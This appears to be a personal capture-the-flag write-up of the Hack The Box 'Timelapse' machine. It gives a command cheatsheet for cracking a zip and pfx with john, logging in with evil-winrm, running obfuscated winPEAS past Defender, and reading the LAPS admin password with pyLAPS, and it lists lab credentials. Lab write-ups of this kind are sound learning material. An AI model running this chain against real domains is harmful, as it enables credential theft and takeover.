# Timelapse \[Easy]

## Report

A zip file of winrm is retrieved from public available SMB share which when cracked using john gives a pfx file that is further cracked to give a certificate and private key assumably for the user legaccy which is mentioned. Another directory mentioning LAPS management and usage is also visible.

Port 5986 means evil-winrm should be run with the -S flag (SSL over HTTP)

Windows Defender blocks normal exe of winPEAS so run the obfuscated version and expose creds for user svc\_deploy

svc\_deploy is part of the group "LAPS\_READERS" which can expose the LAPS password of the DC. Use this to login is Administrator

## Cheatsheet

```
#ANYTHING THAT REQUIRES A PASSPHRASE -> ${FILE_FORMAT}tojohn
zip2john winrm_backup.zip > winrm_backup_zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup_zip.hash 

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out yourkey_enc.pem
openssl rsa -in yourkey_enc.pem -out yourkey_dec.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt

#For user legaccy
evil-winrm -i timelapse.htb -S -c certificate.crt -k yourkey_dec.pem

winPEASx64_ofs.exe reveal powershell history
bloodhound
other users: trx, payload and svc_deploy

C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
evil-winrm -i timelapse.htb -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
DC01$                : ++9aAz4]0l8gipl@6Be.1i$$
evil-winrm -i timelapse.htb -S -u Administrator -p '++9aAz4]0l8gipl@6Be.1i$$'
```

## Loot

### Creds

legacy: public cert and private key from pfx file

svc\_deploy:E3R$Q62^12p7PLlC%KWaxuaV

Administrator:++9aAz4]0l8gipl@6Be.1i\$$

### Proof

How does LAPS work again exactly?

One LAPS manages diff passwords for all admins in domain, but what if the LAPS Manager gets compromised?

It reveals the password of the admin of that DC and system

svc\_deploy was part of a group that could read LAPS creds, BloodHound confirmed it but we can do our manual recon as well, from there pyLAPS.py did the rest

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Learning how to use Bloodhound better has been a gamechanger so far
